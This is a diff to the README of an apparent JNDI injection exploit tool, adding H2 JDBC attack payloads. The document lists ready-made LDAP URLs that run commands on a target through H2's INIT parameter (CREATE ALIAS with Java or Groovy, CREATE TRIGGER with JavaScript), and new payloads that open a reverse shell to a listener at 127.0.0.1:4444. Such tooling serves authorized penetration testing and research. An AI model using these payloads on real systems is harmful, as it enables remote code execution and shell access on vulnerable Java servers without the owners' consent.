@@ -234,14 +234,19 @@ ldap://127.0.0.1:1389/Factory/PostgreSQL/Command/open -a Calculator
 
 #### H2
 
-Execute SQL statements via the INIT parameter of the H2 JDBC URL
+Execute SQL statements via the INIT parameter of the H2 JDBC URL, support command execution and native reverse shell
 
 Support three methods: CREATE ALIAS + Java/Groovy, CREATE TRIGGER + JavaScript
 
 ```bash
-ldap://127.0.0.1:1389/Factory/H2/Java/open -a Calculator
-ldap://127.0.0.1:1389/Factory/H2/Groovy/open -a Calculator
-ldap://127.0.0.1:1389/Factory/H2/JavaScript/open -a Calculator
+# command execution
+ldap://127.0.0.1:1389/Factory/H2/Java/Command/open -a Calculator
+ldap://127.0.0.1:1389/Factory/H2/Groovy/Command/open -a Calculator
+ldap://127.0.0.1:1389/Factory/H2/JavaScript/Command/open -a Calculator
+
+# native reverse shell (not support Groovy yet)
+ldap://127.0.0.1:1389/Factory/H2/Java/ReverseShell/127.0.0.1/4444
+ldap://127.0.0.1:1389/Factory/H2/JavaScript/ReverseShell/127.0.0.1/4444
 ```
 
 #### Derby
